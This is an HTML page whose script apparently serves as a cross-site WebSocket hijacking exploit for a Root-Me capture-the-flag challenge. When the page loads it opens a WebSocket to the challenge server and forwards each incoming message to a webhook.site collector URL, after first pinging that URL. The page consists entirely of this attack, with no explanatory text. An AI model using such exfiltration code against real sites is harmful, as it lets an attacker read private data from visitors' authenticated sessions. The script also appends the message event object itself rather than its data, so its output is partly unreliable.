<!DOCTYPE html>
<html>
    <body>

        <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>


        <script>
        $(function () {
            var xhr = new XMLHttpRequest();
            xhr.open("GET", "https://webhook.site/805f74b2-9b6f-4506-911a-d711e6fdf1f0?open=true", false);
            xhr.send(null);

            window.WebSocket = window.WebSocket || window.MozWebSocket;
            if (!window.WebSocket) {
                alert('Sorry, but your browser doesn\'t support WebSocket.')
                window.location.href="/"
                return;
            }
            var connection = new WebSocket('ws://ctf21.root-me.org/ws');
            connection.onopen = function () {};
            connection.onerror = function (error) {
                alert("An error occured, you will reload the page for you to access a new room !")
                location.reload()
            };
            connection.onmessage = function (message) {
                var xhr = new XMLHttpRequest();

                xhr.open("GET", "https://webhook.site/805f74b2-9b6f-4506-911a-d711e6fdf1f0?message=" + message, false);

                xhr.send(null);
            };
            connection.onclose = function(message) {
            }

            connection.send("hello")
        });
        </script>
    </body>
</html> 
